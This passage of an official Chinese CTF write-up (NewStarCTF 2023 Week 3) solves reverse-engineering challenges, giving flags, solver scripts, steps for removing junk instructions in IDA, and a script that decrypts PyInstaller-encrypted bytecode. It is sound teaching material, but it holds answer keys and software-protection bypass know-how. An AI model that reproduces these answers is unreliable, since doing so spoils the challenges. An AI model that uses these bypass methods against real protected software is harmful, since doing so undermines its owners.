class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {</div><div line="4iWR" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, *((<span class="hljs-type">char</span>*)enc + i));</div><div line="UYuj" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; }</div><div line="fF2h" data-language="cpp" class="ql-code-block">&nbsp; &nbsp; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</div><div line="4Gi0" data-language="cpp" class="ql-code-block">}</div></div><p ql-global="true" line="XFTP">flag{Let's_Dr1nk_A_Cup_Of_Te4!!}</p><p ql-global="true" line="0qNo"><br></p><p ql-global="true" line="rOzS"><br></p><h1><div ql-global="true" line="BORd" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Andronative</div></h1><ul data-list-style="circle"><li ql-global="true" line="3iVL" class="bullet-item"><strong>考点</strong>: <span class="ql-font-microsoftyahei">使用IDA进行Native远程调试+简单算法+LazyIDA的使用</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="FOzG" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{I_hate_le333ekk_asd213sadlgajaieo2sa_this_is_s0?}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="rwIL" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="v7Uj">拖入jeb可以看到 在encode位置 传入了输入和luckystar字符</p><p ql-global="true" line="ffxJ">而encode函数是在native层实现的</p><h2><div ql-global="true" line="00Sf" data-header="2" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="979" height="auto" ori-width="979" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(5).png" ori-height="575" data-src="https://uploader.shimo.im/f/UmsnlEcuyczokjtD.png!thumbnail" crossorigin="anonymous"></span></span></span></div></h2><p ql-global="true" line="ohwW">解包得到libandronative.so文件</p><p ql-global="true" line="F1C1">然后进入encode函数查看对输入的操作</p><p ql-global="true" line="SWtQ"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1048" height="auto" ori-width="1048" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(6).png" ori-height="631" data-src="https://uploader.shimo.im/f/ZwNMb3GjAJCOXeBs.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="6nkD">由结尾可以得到，加密后的字符串对比以test操作</p><p ql-global="true" line="wvL3">跟入test操作</p><p ql-global="true" line="iMBr"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1009" height="auto" ori-width="1009" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(7).png" ori-height="801" data-src="https://uploader.shimo.im/f/Xu98yLJhrhWMtTFp.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="WCRH">可以发现为base64变表</p><p ql-global="true" line="ciev">045UVWXDE6789ABCMtuvgh123ijklSTFGHwxfIJKLYZmnoNOPQRabcdepqrsyz</p><p ql-global="true" line="VFbi">为变表内容</p><p ql-global="true" line="MMq3">解决完变表问题后接着查看题目逻辑</p><p ql-global="true" line="2usa">剩下的逻辑因为编译器的优化导致函数内联，静态不是很好弄明白，需要用到动态调试解决。</p><p ql-global="true" line="pacX"><a class="ql-link" href="https://www.cnblogs.com/fuhua/p/12740482.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMxMTIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODE1MjgxMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.DCaFYw7V0Y72gh5281Lf_LZXMwp5i0HBVhaQ3_UA3rU" target="_blank" rel="noopener noreferrer nofollow">安卓逆向11.IDA以Debug模式启动APK调试SO的JNI_OnLoad函数的两种办法 - 凉游浅笔深画眉 - 博客园 (cnblogs.com)</a></p><p ql-global="true" line="xcwV">可以得到解题脚本</p><div class="ql-code-block-container" data-language="plain" spellcheck="false"><div line="leiZ" data-language="plain" class="ql-code-block">  #Androdnative解密</div><div line="oYzL" data-language="plain" class="ql-code-block">import base64</div><div line="tK7U" data-language="plain" class="ql-code-block">data='1903j4GLV8GGbWfPdN4Y3EEPf1ZuyUfZr5HHbBU3ZlDGwCf0rImp'</div><div line="h9Qi" data-language="plain" class="ql-code-block">old='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</div><div line="4DmL" data-language="plain" class="ql-code-block">new='045UVWXDE6789ABCMtuvgh123ijklSTFGHwxfIJKLYZmnoNOPQRabcdepqrsyz+/'</div><div line="53nq" data-language="plain" class="ql-code-block">result=''</div><div line="U07V" data-language="plain" class="ql-code-block">for i in range(len(data)):</div><div line="6vAO" data-language="plain" class="ql-code-block">&nbsp; &nbsp; result+=old[new.find(data[i])] #对照新的换成旧表</div><div line="wYCE" data-language="plain" class="ql-code-block">result=list(base64.b64decode(result))</div><div line="5BDz" data-language="plain" class="ql-code-block">print(result)</div><div line="tdq9" data-language="plain" class="ql-code-block"><br></div><div line="FkTh" data-language="plain" class="ql-code-block">box=[1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 11, 10, 13, 12, 15, 14, 17, 16, 19, 18, 21, 20, 23, 22, 25, 24, 27, 26, 29, 28, 31, 30, 33, 32, 35,&nbsp;</div><div line="kCBc" data-language="plain" class="ql-code-block">34, 37, 36, 39, 38, 41, 40, 43, 42, 45, 44, 47, 46, 49, 48, 51, 50, 53, 52, 55, 54, 57, 56, 59, 58, 61, 60, 63, 62, 65, 64, 67, 66, 69, 68, 71, 70, 73, 72, 75, 74, 77, 76, 79, 78, 81, 80, 83, 82, 85, 84, 87, 86, 89, 88, 91, 90, 93, 92, 95, 94, 97, 96, 99, 98, 101, 100, 103, 102, 105, 104, 107, 106, 109, 108, 111, 110, 113, 112, 115, 114, 117, 116, 119, 118, 121, 120, 123, 122, 125, 124, 127, 126, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178,&nbsp;</div><div line="l5Sf" data-language="plain" class="ql-code-block">179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]</div><div line="BSEG" data-language="plain" class="ql-code-block"><br></div><div line="db8u" data-language="plain" class="ql-code-block"><br></div><div line="j7s1" data-language="plain" class="ql-code-block">for k in range(len(result)):</div><div line="1LQ7" data-language="plain" class="ql-code-block">&nbsp; &nbsp; result[k]=(((result[k]&gt;&gt;5)&amp;0xff)|(result[k]&lt;&lt;3)&amp;0xff)&amp;0xff;</div><div line="VlMz" data-language="plain" class="ql-code-block">&nbsp; &nbsp; result[k]=(((result[k]&gt;&gt;6)&amp;0xff)|(result[k]&lt;&lt;2)&amp;0xff)&amp;0xff;</div><div line="5pUb" data-language="plain" class="ql-code-block">&nbsp; &nbsp; result[k]^=ord(key[k%len(key)])</div><div line="hoa6" data-language="plain" class="ql-code-block">&nbsp; &nbsp; for i in range(len(box)):</div><div line="3s8l" data-language="plain" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; if result[k]==box[i]:</div><div line="SBjS" data-language="plain" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; result[k]=i</div><div line="1ldw" data-language="plain" class="ql-code-block">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break</div><div line="onwY" data-language="plain" class="ql-code-block">print(''.join([chr(i) for i in result]))</div><div line="n2cd" data-language="plain" class="ql-code-block"><br></div></div><p ql-global="true" line="4ZRY"><br></p><p ql-global="true" line="jlrE"><br></p><h1><div ql-global="true" line="YY3o" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>花</div></h1><ul data-list-style="circle"><li ql-global="true" line="FZb1" class="bullet-item"><strong>考点</strong>: <span class="ql-font-microsoftyahei">花 + RC4</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="NzhH" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{You!FlowerMaster!YouPassTheThirdPZGALAXYlevel!}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="tTgf" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="Q6WD">无壳32位</p><p ql-global="true" line="ZhU5"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1444" height="auto" ori-width="1444" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(8).png" ori-height="917" data-src="https://uploader.shimo.im/f/hxPojIvrqCrSbYg5.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="3u13">拉进ida32发现 main 函数报红了</p><p ql-global="true" line="ROjq"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1559" height="auto" ori-width="1559" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(9).png" ori-height="862" data-src="https://uploader.shimo.im/f/lxk699jI2tDcxiaE.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="mBKE">这种情况一般有几种情况 IDA分析出错 出题人写的汇编并不是C 有混淆</p><p ql-global="true" line="gCFL">而这种情况就是有混淆，这个考点就是花指令，该类指令意思是扰乱IDA分析，而对程序实际运行其实没有影响，和壳一样属于保护程序的一种对抗逆向工程手段，该程序给出了最经典的花指令形式，往下拉找花指令可以发现</p><p ql-global="true" line="GQxO"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1458" height="auto" ori-width="1458" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(10).png" ori-height="234" data-src="https://uploader.shimo.im/f/W8ucxytUUrVFwGmk.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="GVIF">jz jnz，该类跳转语句根据 ZF 跳转，全程 jmp zero jmp not zero，而标志位ZF只有0或1，所以这里就是绝对跳转到loc_401667+1，现在在爆红的地址按下 u 修改为未定义</p><p ql-global="true" line="lzxN"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1564" height="auto" ori-width="1564" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(11).png" ori-height="589" data-src="https://uploader.shimo.im/f/UhkDyy5uIHkzxxEN.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="VGAx">可以发现会跳转到unk_401668，而401667这条字节码其实永远不会执行，再在401668按下C，再把E8改成90，意思是改成nop语句，就不会对程序有任何扰乱的分析了</p><p ql-global="true" line="52NV"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1553" height="auto" ori-width="1553" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(12).png" ori-height="691" data-src="https://uploader.shimo.im/f/Ge1qenYWMiJ7LW9O.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="FuOf">最后再回去main函数开头按下p，转成函数形式，随后即可分析伪代码可以发现即使RC4加密</p><p ql-global="true" line="FrA3"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1395" height="auto" ori-width="1395" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(13).png" ori-height="614" data-src="https://uploader.shimo.im/f/2m3ekwXm3gGRPKUD.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="xXHE">其中 Init 和 crypt 也有类似的花指令，分析完可知无任何魔改，直接标准解密即可</p><p ql-global="true" line="q9wZ">Get Flag!</p><p ql-global="true" line="ARDx"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1404" height="auto" ori-width="1404" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(14).png" ori-height="1152" data-src="https://uploader.shimo.im/f/U35pgHa60cn3ykCu.png!thumbnail" crossorigin="anonymous"></span></span></span></p><h1><div ql-global="true" line="5rXS" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>pyexe</div></h1><ul data-list-style="circle"><li ql-global="true" line="qxWG" class="bullet-item"><strong>考点</strong>: <span class="ql-font-microsoftyahei">python打包但用了key</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="TJcp" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{no_ke1_no_fuN!}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="pdfC" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="Xgyo">不同于上周的Pzthon，直接pyinstxtractor，得到的文件是加密过的。也有提示可能是加密了</p><p ql-global="true" line="m1ZA"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1164" height="auto" ori-width="1164" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(15).png" ori-height="513" data-src="https://uploader.shimo.im/f/lr2NAgO2lEgCShXc.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="YDSz">经过搜索可以找到修复脚本。</p><p ql-global="true" line="QOh2">解密pyc文件</p><p ql-global="true" line="ozrB">fix.py</p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="aJ3q" data-language="python" class="ql-code-block"><span class="hljs-keyword">import</span> zlib</div><div line="cbij" data-language="python" class="ql-code-block"><span class="hljs-keyword">import</span> tinyaes</div><div line="H8cs" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path</div><div line="xQ04" data-language="python" class="ql-code-block">CRYPT_BLOCK_SIZE = <span class="hljs-number">16</span></div><div line="7CzK" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fix</span>():</div><div line="qbrC" data-language="python" class="ql-code-block">    <span class="hljs-comment"># key obtained from pyimod00_crypto_key</span></div><div line="Mkav" data-language="python" class="ql-code-block">    key = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">'00000000new1star'</span>, <span class="hljs-string">'utf-8'</span>)</div><div line="mPAG" data-language="python" class="ql-code-block">    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> Path(<span class="hljs-string">"./fakekey.exe_extracted/PYZ-00.pyz_extracted"</span>).glob(<span class="hljs-string">"**/*.pyc.encrypted"</span>):</div><div line="vRyA" data-language="python" class="ql-code-block">        inf = <span class="hljs-built_in">open</span>(p, <span class="hljs-string">'rb'</span>)  <span class="hljs-comment"># encrypted file input</span></div><div line="jOnh" data-language="python" class="ql-code-block">        outf = <span class="hljs-built_in">open</span>(p.with_name(p.stem), <span class="hljs-string">'wb'</span>)  <span class="hljs-comment"># output file</span></div><div line="5FGR" data-language="python" class="ql-code-block">        <span class="hljs-comment"># Initialization vector</span></div><div line="SgJi" data-language="python" class="ql-code-block">        iv = inf.read(CRYPT_BLOCK_SIZE)</div><div line="X0DU" data-language="python" class="ql-code-block">        cipher = tinyaes.AES(key, iv)</div><div line="F9Uq" data-language="python" class="ql-code-block">        <span class="hljs-comment"># Decrypt and decompress</span></div><div line="iEED" data-language="python" class="ql-code-block">        plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read()))</div><div line="HrLL" data-language="python" class="ql-code-block">        <span class="hljs-comment"># Write pyc header</span></div><div line="J6kZ" data-language="python" class="ql-code-block">        <span class="hljs-comment"># The header below is for Python 3.8</span></div><div line="qtna" data-language="python" class="ql-code-block">        outf.write(<span class="hljs-string">b'\x55\x0d\x0d\x0a\0\0\0\0\0\0\0\0\0\0\0\0'</span>)</div><div line="lwNl" data-language="python" class="ql-code-block">        <span class="hljs-comment"># Write decrypted data</span></div><div line="KmyH" data-language="python" class="ql-code-block">        outf.write(plaintext)</div><div line="Flbz" data-language="python" class="ql-code-block">        inf.close()</div><div line="hlgK" data-language="python" class="ql-code-block">        outf.close()</div><div line="RyNk" data-language="python" class="ql-code-block">        <span class="hljs-comment"># Delete .pyc.encrypted file</span></div><div line="krpG" data-language="python" class="ql-code-block">        p.unlink()</div></div><p ql-global="true" line="e8xk">key来自pyimod00_crypto_key.pyc文件</p><p ql-global="true" line="XpgH"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="676" height="auto" ori-width="676" src="./NewStarCTF 2023 Week3 官方WriteUp_files/image(16).png" ori-height="245" data-src="https://uploader.shimo.im/f/vI58TeoICnA0aaeL.png!thumbnail" crossorigin="anonymous"></span></span></span>反编译pyc文件</p><p ql-global="true" line="B6XQ">使用uncompyle6即可</p><p ql-global="true" line="JM1P">fakekey.py</p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="juz4" data-language="python" class="ql-code-block"><br></div><div line="kdlV" data-language="python" class="ql-code-block"><span class="hljs-keyword">import</span> base64</div><div line="0tqh" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> settings <span class="hljs-keyword">import</span> key</div><div line="sRW0" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">eval_</span>(<span class="hljs-params">data</span>):</div><div line="lEUj" data-language="python" class="ql-code-block">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(base64.b64decode(data))[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>]</div><div line="Z9vW" data-language="python" class="ql-code-block"><br></div><div line="FbjZ" data-language="python" class="ql-code-block">consefued2 = [<span class="hljs-string">b'MA=='</span>, <span class="hljs-string">b'MQ=='</span>, <span class="hljs-string">b'Mg=='</span>, <span class="hljs-string">b'Mw=='</span>, <span class="hljs-string">b'NA=='</span>, <span class="hljs-string">b'NQ=='</span>, <span class="hljs-string">b'Ng=='</span>, <span class="hljs-string">b'Nw=='</span>, <span class="hljs-string">b'OA=='</span>, <span class="hljs-string">b'OQ=='</span>, <span class="hljs-string">b'YQ=='</span>, <span class="hljs-string">b'Yg=='</span>, <span class="hljs-string">b'Yw=='</span>, <span class="hljs-string">b'ZA=='</span>, <span class="hljs-string">b'ZQ=='</span>, <span class="hljs-string">b'Zg=='</span>, <span class="hljs-string">b'Zw=='</span>, <span class="hljs-string">b'aA=='</span>, <span class="hljs-string">b'aQ=='</span>, <span class="hljs-string">b'ag=='</span>, <span class="hljs-string">b'aw=='</span>, <span class="hljs-string">b'bA=='</span>, <span class="hljs-string">b'bQ=='</span>, <span class="hljs-string">b'bg=='</span>, <span class="hljs-string">b'bw=='</span>, <span class="hljs-string">b'cA=='</span>, <span class="hljs-string">b'cQ=='</span>, <span class="hljs-string">b'cg=='</span>, <span class="hljs-string">b'cw=='</span>, <span class="hljs-string">b'dA=='</span>, <span class="hljs-string">b'dQ=='</span>, <span class="hljs-string">b'dg=='</span>, <span class="hljs-string">b'dw=='</span>, <span class="hljs-string">b'eA=='</span>, <span class="hljs-string">b'eQ=='</span>, <span class="hljs-string">b'eg=='</span>, <span class="hljs-string">b'QQ=='</span>, <span class="hljs-string">b'Qg=='</span>, <span class="hljs-string">b'Qw=='</span>, <span class="hljs-string">b'RA=='</span>, <span class="hljs-string">b'RQ=='</span>, <span class="hljs-string">b'Rg=='</span>, <span class="hljs-string">b'Rw=='</span>, <span class="hljs-string">b'SA=='</span>, <span class="hljs-string">b'SQ=='</span>, <span class="hljs-string">b'Sg=='</span>, <span class="hljs-string">b'Sw=='</span>, <span class="hljs-string">b'TA=='</span>, <span class="hljs-string">b'TQ=='</span>, <span class="hljs-string">b'Tg=='</span>, <span class="hljs-string">b'Tw=='</span>, <span class="hljs-string">b'UA=='</span>, <span class="hljs-string">b'UQ=='</span>, <span class="hljs-string">b'Ug=='</span>, <span class="hljs-string">b'Uw=='</span>, <span class="hljs-string">b'VA=='</span>, <span class="hljs-string">b'VQ=='</span>, <span class="hljs-string">b'Vg=='</span>, <span class="hljs-string">b'Vw=='</span>, <span class="hljs-string">b'WA=='</span>, <span class="hljs-string">b'WQ=='</span>, <span class="hljs-string">b'Wg=='</span>, <span class="hljs-string">b'IQ=='</span>, <span class="hljs-string">b'Ig=='</span>, <span class="hljs-string">b'Iw=='</span>, <span class="hljs-string">b'JA=='</span>, <span class="hljs-string">b'JQ=='</span>, <span class="hljs-string">b'Jg=='</span>, <span class="hljs-string">b'Jw=='</span>, <span class="hljs-string">b'KA=='</span>, <span class="hljs-string">b'KQ=='</span>, <span class="hljs-string">b'Kg=='</span>, <span class="hljs-string">b'Kw=='</span>, <span class="hljs-string">b'LA=='</span>, <span class="hljs-string">b'LQ=='</span>, <span class="hljs-string">b'Lg=='</span>, <span class="hljs-string">b'Lw=='</span>, <span class="hljs-string">b'Og=='</span>, <span class="hljs-string">b'Ow=='</span>, <span class="hljs-string">b'PA=='</span>, <span class="hljs-string">b'PQ=='</span>, <span class="hljs-string">b'Pg=='</span>, <span class="hljs-string">b'Pw=='</span>, <span class="hljs-string">b'QA=='</span>, <span class="hljs-string">b'Ww=='</span>, <span class="hljs-string">b'XA=='</span>, <span class="hljs-string">b'XQ=='</span>, <span class="hljs-string">b'Xg=='</span>, <span class="hljs-string">b'Xw=='</span>, <span class="hljs-string">b'YA=='</span>, <span class="hljs-string">b'ew=='</span>, <span class="hljs-string">b'fA=='</span>, <span class="hljs-string">b'fQ=='</span>, <span class="hljs-string">b'fg=='</span>, <span class="hljs-string">b'IA=='</span>, <span class="hljs-string">b'CQ=='</span>, <span class="hljs-string">b'Cg=='</span>, <span class="hljs-string">b'DQ=='</span>, <span class="hljs-string">b'Cw=='</span>, <span class="hljs-string">b'DA=='</span>, <span class="hljs-string">b'YmFzZTY0LmI2NGRlY29kZQ=='</span>]</div><div line="w9tw" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_fun2</span>(<span class="hljs-params">fun</span>):</div><div line="0fdV" data-language="python" class="ql-code-block">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">real_fun</span>(<span class="hljs-params">*args</span>):</div><div line="xLNT" data-language="python" class="ql-code-block">        ans = fun(*args)</div><div line="hibT" data-language="python" class="ql-code-block">        ans.pop(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">eval</span>(eval_(<span class="hljs-string">b'YmFzZTY0LmI2NGRlY29kZQ=='</span>) + <span class="hljs-string">'(consefued2[0])'</span>)) - <span class="hljs-number">3</span>)</div><div line="c0Ug" data-language="python" class="ql-code-block">        ans.pop(<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">eval</span>(eval_(<span class="hljs-string">b'YmFzZTY0LmI2NGRlY29kZQ=='</span>) + <span class="hljs-string">'(consefued2[5])'</span>)))</div><div line="JYuU" data-language="python" class="ql-code-block">        <span class="hljs-keyword">return</span> ans</div><div line="U7rv" data-language="python" class="ql-code-block">    <span class="hljs-keyword">return</span> real_fun</div><div line="BHKI" data-language="python" class="ql-code-block"><br></div><div line="PDPC" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">plaintext</span>):</div><div line="xIfz" data-language="python" class="ql-code-block">    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(plaintext))</div><div line="1Pyk" data-language="python" class="ql-code-block">    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))</div><div line="IP15" data-language="python" class="ql-code-block">    j = <span class="hljs-number">0</span></div><div line="XFAa" data-language="python" class="ql-code-block">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</div><div line="9Do5" data-language="python" class="ql-code-block">        j = (j + S[i] + key[(i % <span class="hljs-built_in">len</span>(key))]) % <span class="hljs-number">256</span></div><div line="ruTQ" data-language="python" class="ql-code-block">        S[i], S[j] = S[j], S[i]</div><div line="XEu8" data-language="python" class="ql-code-block">    <span class="hljs-keyword">else</span>:</div><div line="xfl7" data-language="python" class="ql-code-block">        i, j = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</div><div line="Pzmy" data-language="python" class="ql-code-block">        keystream = []</div><div line="3QuO" data-language="python" class="ql-code-block">        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plaintext)):</div><div line="tx6G" data-language="python" class="ql-code-block">            i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span></div><div line="Ve6p" data-language="python" class="ql-code-block">            j = (j + S[i]) % <span class="hljs-number">256</span></div><div line="A2Hq" data-language="python" class="ql-code-block">            S[i], S[j] = S[j], S[i]</div><div line="CdEC" data-language="python" class="ql-code-block">            k = S[((S[i] + S[j]) % <span class="hljs-number">256</span>)]</div><div line="9Mt6" data-language="python" class="ql-code-block">            keystream.append(k)</div><div line="ntY2" data-language="python" class="ql-code-block">        <span class="hljs-keyword">else</span>:</div><div line="vvsF" data-language="python" class="ql-code-block">            ciphertext = []</div><div line="P45g" data-language="python" class="ql-code-block">            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plaintext)):</div><div line="Vgzj" data-language="python" class="ql-code-block">                ciphertext.append(<span class="hljs-built_in">ord</span>(plaintext[i]) ^ keystream[i] ^ <span class="hljs-number">5</span>)</div><div line="8ljr" data-language="python" class="ql-code-block">            <span class="hljs-keyword">else</span>:</div><div line="OqQU" data-language="python" class="ql-code-block">                <span class="hljs-keyword">return</span> ciphertext</div><div line="S8FY" data-language="python" class="ql-code-block"><br></div><div line="A3OR" data-language="python" class="ql-code-block"><span class="hljs-meta">@change_fun2</span></div><div line="Ibfj" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode1</span>(<span class="hljs-params">text</span>):</div><div line="cx9e" data-language="python" class="ql-code-block">    res = main(text)</div><div line="1ggu" data-language="python" class="ql-code-block">    <span class="hljs-keyword">return</span> res</div><div line="pbqU" data-language="python" class="ql-code-block"><br></div><div line="wmNc" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode2</span>(<span class="hljs-params">xxxx</span>):</div><div line="auym" data-language="python" class="ql-code-block">    <span class="hljs-keyword">return</span> base64.b64encode((<span class="hljs-string">b''</span>).join([<span class="hljs-built_in">chr</span>(t).encode() <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> xxxx]))</div><div line="pzc9" data-language="python" class="ql-code-block"><br></div><div line="kz6i" data-language="python" class="ql-code-block"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</div><div line="b01U" data-language="python" class="ql-code-block">    <span class="hljs-built_in">print</span>(<span class="hljs-string">'���,ף����Ϸ���'</span>)</div><div line="gFmP" data-language="python" class="ql-code-block">    flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">'������flag (flag�ĳ���Ϊ20)&gt; '</span>)</div><div line="od7D" data-language="python" class="ql-code-block">    b = encode2(encode1(flag))</div><div line="6CdF" data-language="python" class="ql-code-block">    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">20</span></div><div line="LRmE" data-language="python" class="ql-code-block">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</div><div line="A7kJ" data-language="python" class="ql-code-block">        <span class="hljs-keyword">if</span> b == <span class="hljs-string">b'IMKJw4jCkgQxw6A1w5QRw7A5SG14wobDs8KF'</span>:</div><div line="3oP9" data-language="python" class="ql-code-block">            <span class="hljs-built_in">print</span>(<span class="hljs-string">'you are right!'</span>)</div><div line="BwjP" data-language="python" class="ql-code-block">            <span class="hljs-keyword">break</span></div><div line="0cXH" data-language="python" class="ql-code-block">         <span class="hljs-keyword">else</span>:</div><div line="SyP1" data-language="python" class="ql-code-block">             <span class="hljs-built_in">print</span>(<span class="hljs-string">'work hard'</span>)</div><div line="jKHG" data-language="python" class="ql-code-block"><span class="hljs-comment"># okay decompiling 